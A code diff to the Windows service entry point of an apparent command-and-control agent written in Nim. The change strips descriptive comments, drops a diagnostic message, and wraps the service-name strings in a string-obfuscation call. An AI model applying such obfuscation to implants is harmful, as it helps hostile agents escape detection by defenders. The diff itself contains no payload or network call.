@@ -1,11 +1,7 @@
-##
-## Windows Service Entry Point for Poopsie Agent
-## Implements Windows service control handler for running agent as a service
-##
-
 import winim/lean
 import agent
 import std/os
+import utils/strenc
 
 when defined(windows):
   var
@@ -127,7 +123,7 @@ when defined(windows):
   # Service dispatcher - this is the actual entry point
   proc StartServiceDispatcher*() =
     # Get service name from environment variable set during build
-    let serviceNameStr = getEnv("SERVICE_NAME", "PoopsieService")
+    let serviceNameStr = getEnv(obf("SERVICE_NAME"), obf("PoopsieService"))
     serviceName = newWideCString(serviceNameStr)
 
     # Create service table
@@ -143,5 +139,4 @@ when defined(windows):
 else:
   # Non-Windows platforms don't support service mode
   proc StartServiceDispatcher*() =
-    echo "Service mode is only supported on Windows"
     quit(1)
